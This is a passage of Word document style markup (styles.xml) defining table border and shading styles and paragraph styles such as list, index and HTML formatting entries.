      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent2">
    <w:name w:val="Light Grid Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:locked/>
    <w:rsid w:val="00385438"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="CA1E17"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A1E17" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="CA1E17"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A1E17" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="CA1E17"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A1E17" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F7C1BF" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F7C1BF" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="CA1E17" w:themeColor="accent2"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent5">
    <w:name w:val="Light Grid Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:locked/>
    <w:rsid w:val="00566193"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="4591CE"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591CE" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="4591CE"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591CE" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="4591CE"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591CE" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D0E3F2" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D0E3F2" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="4591CE" w:themeColor="accent5"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent5">
    <w:name w:val="Medium Grid 1 Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:locked/>
    <w:rsid w:val="00FD75E6"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="73ACDA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="73ACDA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="73ACDA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="73ACDA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="73ACDA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="73ACDA" w:themeColor="accent5" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="D0E3F2" w:themeFill="accent5" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="73ACDA" w:themeColor="accent5" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A2C7E6" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="A2C7E6" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="LightGrid-Accent3">
    <w:name w:val="Light Grid Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="62"/>
    <w:locked/>
    <w:rsid w:val="003621E6"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="18BF2B"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18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="18" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="18BF2B"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18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="18BF2B"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18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="BEF7C4" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="BEF7C4" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:left w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:bottom w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:right w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
          <w:insideV w:val="single" w:sz="8" w:space="0" w:color="18BF2B" w:themeColor="accent3"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QABullets">
    <w:name w:val="QA Bullets"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="QABulletsChar"/>
    <w:qFormat/>
    <w:rsid w:val="00840C10"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:ind w:left="568" w:hanging="284"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent1">
    <w:name w:val="Medium Grid 1 Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:locked/>
    <w:rsid w:val="005A302A"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="007EF4" w:themeColor="accent1" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="007EF4" w:themeColor="accent1" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="007EF4" w:themeColor="accent1" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="007EF4" w:themeColor="accent1" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="007EF4" w:themeColor="accent1" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="007EF4" w:themeColor="accent1" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="A7D4FF" w:themeFill="accent1" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="007EF4" w:themeColor="accent1" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4EA9FF" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4EA9FF" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="DocumentMap">
    <w:name w:val="Document Map"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="DocumentMapChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="DocumentMapChar">
    <w:name w:val="Document Map Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="DocumentMap"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLAddress">
    <w:name w:val="HTML Address"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLAddressChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HTMLAddressChar">
    <w:name w:val="HTML Address Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="HTMLAddress"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HTMLPreformattedChar">
    <w:name w:val="HTML Preformatted Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="HTMLPreformatted"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index2">
    <w:name w:val="index 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="480" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index3">
    <w:name w:val="index 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="720" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index4">
    <w:name w:val="index 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="960" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index5">
    <w:name w:val="index 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="1200" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index6">
    <w:name w:val="index 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="1440" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index7">
    <w:name w:val="index 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="1680" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index8">
    <w:name w:val="index 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="1920" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index9">
    <w:name w:val="index 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="2160" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IndexHeading">
    <w:name w:val="index heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Index1"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List">
    <w:name w:val="List"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="283" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List2">
    <w:name w:val="List 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="566" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List3">
    <w:name w:val="List 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="849" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List4">
    <w:name w:val="List 4"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="1132" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="List5">
    <w:name w:val="List 5"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="1415" w:hanging="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet">
    <w:name w:val="List Bullet"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="360"/>
      </w:tabs>
      <w:ind w:left="360" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet2">
    <w:name w:val="List Bullet 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="643"/>
